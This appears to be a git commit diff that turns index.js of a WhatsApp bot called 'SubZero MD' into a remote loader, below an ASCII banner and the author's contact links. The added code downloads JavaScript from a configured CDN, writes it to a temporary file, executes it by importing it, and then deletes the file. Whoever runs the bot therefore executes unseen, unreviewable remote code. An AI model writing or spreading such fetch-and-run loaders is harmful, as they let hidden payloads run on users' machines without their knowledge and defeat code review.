5ab53e9dd476abb55f38a7d8519a42e544ba6aab
𝐃𝐀𝐑𝐑𝐄𝐋𝐋 𝐌𝐔𝐂𝐇𝐄𝐑𝐈 ⚡ <darrelltakudzwa9@gmail.com>
2026-04-06 14:17:25 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,1 +1,54 @@
-fjfj
+/*
+
+$$$$$$\            $$\                                               
+$$  __$$\           $$ |                                              
+$$ /  \__|$$\   $$\ $$$$$$$\  $$$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$\  
+\$$$$$$\  $$ |  $$ |$$  __$$\ \____$$  |$$  __$$\ $$  __$$\ $$  __$$\ 
+ \____$$\ $$ |  $$ |$$ |  $$ |  $$$$ _/ $$$$$$$$ |$$ |  \__|$$ /  $$ |
+$$\   $$ |$$ |  $$ |$$ |  $$ | $$  _/   $$   ____|$$ |      $$ |  $$ |
+\$$$$$$  |\$$$$$$  |$$$$$$$  |$$$$$$$$\ \$$$$$$$\ $$ |      \$$$$$$  |
+ \______/  \______/ \_______/ \________| \_______|\__|       \______/
+
+@ Project Name : SubZero MD
+* Creator      : Darrell Mucheri ( Mr Frank OFC )
+* My Git       : https//github.com/mrfr8nk
+* Contact      : wa.me/263776046121
+* Channel      : https://whatsapp.com/channel/0029Vb7D70MI7BeC0xUnKb05
+* Release Date : 15 December 2024 12.01 AM
+*/
+
+
+
+import axios from 'axios';
+import fs from 'fs';
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+import config from './settings.js';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
+(async () => {
+  try {
+    console.log("❄️ Subzero Synchronization Initiated !");
+
+    const { data: scriptCode } = await axios.get(
+      `${config.CDN}/media/2026/mrfrank/subzero/index.js`
+    );
+
+    const tempPath = path.join(__dirname, 'temp-script.mjs');
+
+    
+    fs.writeFileSync(tempPath, scriptCode);
+
+    
+    await import(`file://${tempPath}`);
+
+    
+    fs.unlinkSync(tempPath);
+
+  } catch (err) {
+    console.error("Error:", err);
+  }
+})();
